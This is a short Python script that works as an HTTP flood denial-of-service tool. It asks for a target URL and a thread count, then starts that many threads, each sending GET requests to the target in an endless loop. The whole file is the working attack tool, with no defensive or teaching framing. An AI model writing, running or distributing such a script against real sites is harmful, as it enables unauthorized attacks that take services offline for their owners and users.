import threading
import requests

def dos(target):
    while True:
        try:
            res = requests.get(target)
            print("Request sent!")
        except requests.exceptions.ConnectionError:
            print("[+] Connection error!")

url = input("URL: ")

try:
    threads = int(input("Threads: "))
except ValueError:
    exit("Threads count is incorrect!")

if threads <= 0:
    exit("Threads count must be a positive integer!")

if not ("http" in url or "https" in url):
    exit("URL doesn't contain http or https!")

if "." not in url:
    exit("Invalid domain")

for i in range(threads):
    thr = threading.Thread(target=dos, args=(url,))
    thr.start()
    print(str(i + 1) + " thread started!")
